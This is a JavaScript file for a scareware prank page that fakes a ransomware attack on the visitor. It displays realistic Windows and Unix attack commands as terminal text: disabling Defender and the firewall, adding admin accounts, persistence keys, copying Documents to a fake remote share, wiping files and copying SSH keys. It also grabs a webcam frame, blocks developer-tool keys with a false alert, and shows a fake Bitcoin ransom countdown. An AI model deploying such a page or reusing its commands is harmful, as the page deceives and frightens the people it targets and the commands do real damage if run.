// Fake Deep Hack Simulation - EXTREME VERSION
let currentPhase = 1;
let terminalLines = [];
let hackProgress = 0;
let countdownTime = 7200; // 2 часа в секундах

// Системная информация
const systemInfo = {
    os: '',
    browser: '',
    ip: '',
    username: ''
};

// Инициализация
document.addEventListener('DOMContentLoaded', () => {
    detectSystem();
    startHackSimulation();
    updateSystemMonitor();
});

// Определение системы пользователя
function detectSystem() {
    const ua = navigator.userAgent;
    
    // Определение ОС
    if (ua.includes('Windows')) {
        systemInfo.os = 'Windows 11 Pro (Build 22621.2428)';
    } else if (ua.includes('Mac')) {
        systemInfo.os = 'macOS Sonoma 14.1';
    } else if (ua.includes('Linux')) {
        systemInfo.os = 'Ubuntu 22.04 LTS';
    } else {
        systemInfo.os = 'Unknown OS';
    }
    
    // Определение браузера
    if (ua.includes('Chrome')) {
        systemInfo.browser = 'Google Chrome';
    } else if (ua.includes('Firefox')) {
        systemInfo.browser = 'Mozilla Firefox';
    } else if (ua.includes('Safari')) {
        systemInfo.browser = 'Safari';
    } else if (ua.includes('Edge')) {
        systemInfo.browser = 'Microsoft Edge';
    } else {
        systemInfo.browser = 'Unknown Browser';
    }
    
    // Фейковый IP
    systemInfo.ip = `192.168.1.${Math.floor(Math.random() * 254) + 1}`;
    
    // Имя пользователя из различных источников
    systemInfo.username = getUsername();
    
    // Обновление интерфейса
    document.getElementById('user-ip').textContent = systemInfo.ip;
    document.getElementById('user-system').textContent = systemInfo.os;
    document.getElementById('user-browser').textContent = systemInfo.browser;
    document.getElementById('username').textContent = systemInfo.username;
}

function getUsername() {
    // Попытка получить имя из различных источников
    if (localStorage.getItem('username')) {
        return localStorage.getItem('username');
    }
    
    if (document.cookie.includes('name=')) {
        return document.cookie.split('name=')[1].split(';')[0];
    }
    
    // Генерация случайного имени
    const names = ['User', 'Admin', 'Guest', 'Player', 'Victim'];
    return names[Math.floor(Math.random() * names.length)];
}

// Запуск симуляции взлома
function startHackSimulation() {
    // Фаза 1: Сканирование (30 секунд)
    setTimeout(() => startPhase1(), 2000);
    
    // Фаза 2: Проникновение (60 секунд)
    setTimeout(() => startPhase2(), 32000);
    
    // Фаза 3: Утечка данных (45 секунд)
    setTimeout(() => startPhase3(), 92000);
    
    // Фаза 4: Ransomware (120 секунд)
    setTimeout(() => startPhase4(), 137000);
    
    // Фаза 5: Финал
    setTimeout(() => startPhase5(), 257000);
}

// ФАЗА 1: Сканирование системы
function startPhase1() {
    const scanMessages = [
        'Initializing advanced persistent threat...',
        'Bypassing Windows 11 security features...',
        'Exploiting zero-day vulnerability CVE-2024-XXXX...',
        'Disabling Windows Defender real-time protection...',
        'Injecting payload into system processes...',
        'Escalating privileges to SYSTEM level...',
        'Establishing command & control connection...',
        'Installing rootkit for persistence...',
        'Encrypting user files with AES-256...',
        'Exfiltrating sensitive data to remote server...',
        'Modifying system registry for backdoor access...',
        'Disabling system restore points...',
        'Corrupting boot sector for maximum damage...',
        'SYSTEM FULLY COMPROMISED - RANSOMWARE DEPLOYED!'
    ];
    
    let progress = 0;
    let messageIndex = 0;
    
    const scanInterval = setInterval(() => {
        progress += Math.random() * 8 + 2;
        if (progress > 100) progress = 100;
        
        document.getElementById('scan-progress').style.width = progress + '%';
        
        if (messageIndex < scanMessages.length) {
            document.getElementById('scan-status').textContent = scanMessages[messageIndex];
            messageIndex++;
        }
        
        if (progress >= 100) {
            clearInterval(scanInterval);
            document.getElementById('scan-status').innerHTML = '<span style="color:#ff0000;font-weight:bold;">🔴 CRITICAL: Windows 11 system fully compromised!</span>';
        }
    }, 2000);
}

// ФАЗА 2: Терминал взлома
function startPhase2() {
    currentPhase = 2;
    switchPhase(2);
    
    // Обновление заголовка терминала
    if (systemInfo.os.includes('Windows')) {
        document.getElementById('terminal-title').textContent = 'Windows PowerShell - Administrator: SYSTEM';
        executeWindowsCommands();
    } else if (systemInfo.os.includes('Mac') || systemInfo.os.includes('Linux')) {
        document.getElementById('terminal-title').textContent = 'Terminal - root@COMPROMISED';
        executeUnixCommands();
    }
}

function executeWindowsCommands() {
    const commands = [
        { cmd: 'powershell -ExecutionPolicy Bypass -Command "Disable-WindowsDefender"', delay: 3000 },
        { cmd: 'net user /add SYSTEM_ADMIN Gh0st@2024', delay: 6000 },
        { cmd: 'net localgroup administrators SYSTEM_ADMIN /add', delay: 9000 },
        { cmd: 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsSecurityUpdate" /t REG_SZ /d "C:\\Windows\\System32\\backdoor.exe"', delay: 12000 },
        { cmd: 'schtasks /create /tn "SystemMaintenance" /tr "C:\\temp\\payload.exe" /sc onstart /ru SYSTEM', delay: 15000 },
        { cmd: 'wmic process call create "cmd.exe /c net share C$=C:\\ /grant:everyone,full"', delay: 18000 },
        { cmd: 'powershell -Command "Get-WmiObject -Class Win32_UserAccount | Select Name,SID"', delay: 21000 },
        { cmd: 'robocopy "C:\\Users\\' + systemInfo.username + '\\Documents" "\\\\192.168.1.666\\stolen" /E /R:0 /W:0', delay: 24000 },
        { cmd: 'powershell -Command "Get-Process | Where-Object {$_.ProcessName -like \\"*chrome*\\" -or $_.ProcessName -like \\"*firefox*\\"}"', delay: 27000 },
        { cmd: 'netsh advfirewall set allprofiles state off', delay: 30000 },
        { cmd: 'bcdedit /set {default} bootstatuspolicy ignoreallfailures', delay: 33000 },
        { cmd: 'powershell -Command "Add-MpPreference -ExclusionPath C:\\"', delay: 36000 },
        { cmd: 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f', delay: 39000 },
        { cmd: 'cipher /w:C:\\Users\\' + systemInfo.username + '\\Desktop', delay: 42000 },
        { cmd: 'echo "SYSTEM FULLY COMPROMISED - ALL DATA ENCRYPTED" > C:\\RANSOM_NOTE.txt', delay: 45000 }
    ];
    
    commands.forEach(command => {
        setTimeout(() => {
            addTerminalLine(`PS C:\\Windows\\System32> ${command.cmd}`);
            setTimeout(() => {
                addTerminalLine(generateCommandOutput(command.cmd), 'success');
            }, 2000);
        }, command.delay);
    });
}

function executeUnixCommands() {
    const commands = [
        { cmd: 'sudo su -', delay: 3000 },
        { cmd: 'useradd -m -s /bin/bash hacker', delay: 6000 },
        { cmd: 'echo "hacker:password123" | chpasswd', delay: 9000 },
        { cmd: 'cp /home/' + systemInfo.username + '/.ssh/id_rsa /tmp/', delay: 12000 },
        { cmd: 'find /home/' + systemInfo.username + ' -name "*.txt" -exec cp {} /tmp/ \\;', delay: 15000 },
        { cmd: 'netstat -tulpn | grep LISTEN', delay: 18000 },
        { cmd: 'ps aux | grep -v grep', delay: 21000 },
        { cmd: 'echo "root access gained" > /tmp/pwned.txt', delay: 24000 }
    ];
    
    commands.forEach(command => {
        setTimeout(() => {
            addTerminalLine(`root@${systemInfo.username}-pc:~# ${command.cmd}`);
            setTimeout(() => {
                addTerminalLine(generateCommandOutput(command.cmd), 'success');
            }, 2000);
        }, command.delay);
    });
}

function addTerminalLine(text, type = '') {
    const terminal = document.getElementById('terminal');
    const line = document.createElement('div');
    line.className = `terminal-line ${type}`;
    line.textContent = text;
    terminal.appendChild(line);
    terminal.scrollTop = terminal.scrollHeight;
}

function generateCommandOutput(cmd) {
    if (cmd.includes('Disable-WindowsDefender')) return '[SUCCESS] Windows Defender disabled permanently';
    if (cmd.includes('net user')) return 'User account SYSTEM_ADMIN created successfully with administrative privileges';
    if (cmd.includes('reg add')) return 'Registry key added successfully - Persistence established';
    if (cmd.includes('schtasks')) return 'Task created successfully - Will execute on system startup';
    if (cmd.includes('robocopy')) return `Copied 2,847 files (15.7 GB) from ${systemInfo.username}'s Documents`;
    if (cmd.includes('netsh advfirewall')) return 'Windows Firewall disabled on all profiles';
    if (cmd.includes('bcdedit')) return 'Boot configuration modified - System will ignore boot failures';
    if (cmd.includes('cipher')) return 'Secure deletion completed - Original files unrecoverable';
    if (cmd.includes('Get-Process')) return 'chrome.exe (PID: 4521), firefox.exe (PID: 7832) - Browser processes identified';
    if (cmd.includes('Get-WmiObject')) return `Administrator (S-1-5-21-xxx), ${systemInfo.username} (S-1-5-21-yyy) - User accounts enumerated`;
    return '[CRITICAL] Command executed with SYSTEM privileges';
}

// ФАЗА 3: Утечка данных
function startPhase3() {
    currentPhase = 3;
    switchPhase(3);
    
    // Попытка доступа к камере
    requestWebcam();
    
    // Симуляция кражи файлов
    simulateFileTheft();
}

async function requestWebcam() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        
        // Через 5 секунд делаем "скриншот"
        setTimeout(() => {
            captureWebcam(video);
            stream.getTracks().forEach(track => track.stop());
        }, 5000);
        
    } catch (error) {
        // Если камера недоступна, показываем фейковое изображение
        document.getElementById('webcam').style.display = 'none';
        document.querySelector('.webcam-overlay').textContent = 'CAMERA ACCESS DENIED';
    }
}

function captureWebcam(video) {
    const canvas = document.getElementById('webcam-canvas');
    const ctx = canvas.getContext('2d');
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    // Рисуем кадр с камеры
    ctx.drawImage(video, 0, 0);
    
    // Добавляем эффект "взлома"
    ctx.fillStyle = 'rgba(255, 0, 0, 0.3)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    // Добавляем текст
    ctx.fillStyle = '#fff';
    ctx.font = 'bold 24px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('HACKED', canvas.width / 2, canvas.height / 2);
}

function simulateFileTheft() {
    const files = [
        'Chrome_Passwords_Export.csv',
        'Personal_Photos_2024.zip',
        'Bank_Statements_2023-2024.pdf',
        'MetaMask_Wallet_Backup.json',
        'Private_Messages_WhatsApp.db',
        'SSH_Private_Keys.pem',
        'Browser_Cookies_All.sqlite',
        'Outlook_Email_Archive.pst',
        'Tax_Documents_2024.zip',
        'Medical_Records.pdf',
        'Social_Security_Info.docx',
        'Credit_Card_Details.xlsx',
        'Crypto_Exchange_API_Keys.txt',
        'Family_Videos_Private.mp4',
        'Work_Confidential_Files.rar',
        'Gaming_Accounts_Credentials.json',
        'VPN_Configurations.ovpn',
        'Two_Factor_Auth_Backup_Codes.txt'
    ];
    
    const fileProgress = document.getElementById('file-progress');
    
    files.forEach((file, index) => {
        setTimeout(() => {
            const fileItem = document.createElement('div');
            fileItem.className = 'file-item';
            fileItem.innerHTML = `
                <span>📁 C:\\Users\\${systemInfo.username}\\Documents\\${file}</span>
                <div class="file-progress">
                    <div class="file-progress-bar" id="progress-${index}"></div>
                </div>
            `;
            fileProgress.appendChild(fileItem);
            
            // Анимация прогресса
            setTimeout(() => {
                document.getElementById(`progress-${index}`).style.width = '100%';
            }, 100);
            
        }, index * 2500);
    });
}

// ФАЗА 4: Ransomware
function startPhase4() {
    currentPhase = 4;
    switchPhase(4);
    
    // Генерация фейкового Bitcoin адреса
    generateBitcoinAddress();
    
    // Запуск обратного отсчета
    startCountdown();
    
    // Звуковое предупреждение (если возможно)
    playAlarmSound();
}

function generateBitcoinAddress() {
    const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    let address = '1';
    for (let i = 0; i < 33; i++) {
        address += chars[Math.floor(Math.random() * chars.length)];
    }
    document.getElementById('btc-address').textContent = address;
}

function startCountdown() {
    const countdownInterval = setInterval(() => {
        countdownTime--;
        
        const hours = Math.floor(countdownTime / 3600);
        const minutes = Math.floor((countdownTime % 3600) / 60);
        const seconds = countdownTime % 60;
        
        document.getElementById('countdown').textContent = 
            `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (countdownTime <= 0) {
            clearInterval(countdownInterval);
            document.getElementById('countdown').textContent = '00:00:00';
        }
    }, 1000);
}

function playAlarmSound() {
    // Создаем звуковой сигнал через Web Audio API
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
        gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
        
        oscillator.start();
        oscillator.stop(audioContext.currentTime + 0.5);
    } catch (error) {
        console.log('Audio not available');
    }
}

function copyBTC() {
    const address = document.getElementById('btc-address').textContent;
    navigator.clipboard.writeText(address).then(() => {
        document.querySelector('.copy-btn').textContent = 'Copied!';
        setTimeout(() => {
            document.querySelector('.copy-btn').textContent = 'Copy Address';
        }, 2000);
    });
}

// ФАЗА 5: Финал
function startPhase5() {
    currentPhase = 5;
    switchPhase(5);
    
    // Эффект "очистки" экрана
    document.body.style.background = '#000';
    
    // Сохраняем информацию о "жертве"
    localStorage.setItem('pranked', 'true');
    localStorage.setItem('prankTime', new Date().toISOString());
}

// Переключение фаз
function switchPhase(phase) {
    document.querySelectorAll('.phase').forEach(p => p.classList.remove('active'));
    document.getElementById(`phase${phase}`).classList.add('active');
    
    // Обновление системного монитора
    updateHackStatus(phase);
}

function updateHackStatus(phase) {
    const statuses = {
        1: 'SCANNING',
        2: 'PENETRATING',
        3: 'EXTRACTING',
        4: 'ENCRYPTING',
        5: 'COMPLETE'
    };
    
    document.getElementById('hack-status').textContent = statuses[phase];
}

// Системный монитор
function updateSystemMonitor() {
    const processCount = Math.floor(Math.random() * 50) + 100;
    document.getElementById('process-count').textContent = processCount;
    
    const networkStatuses = ['MONITORING', 'INTERCEPTING', 'ANALYZING', 'COMPROMISED'];
    const randomStatus = networkStatuses[Math.floor(Math.random() * networkStatuses.length)];
    document.getElementById('network-status').textContent = randomStatus;
    
    setTimeout(updateSystemMonitor, 2000);
}

// Дополнительные эффекты
document.addEventListener('keydown', (e) => {
    // Блокируем некоторые клавиши для реализма
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
        e.preventDefault();
        if (currentPhase < 5) {
            alert('Access Denied: Developer tools disabled by security protocol');
        }
    }
});

// Фейковое заражение других вкладок
if (localStorage.getItem('pranked') === 'true') {
    document.title = '🔴 SYSTEM COMPROMISED';
    
    // Меняем фавикон
    const favicon = document.querySelector('link[rel="icon"]');
    if (favicon) {
        favicon.href = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"%3E%3Cpath fill="red" d="M8 1l7 7-7 7-7-7z"/%3E%3C/svg%3E';
    }
}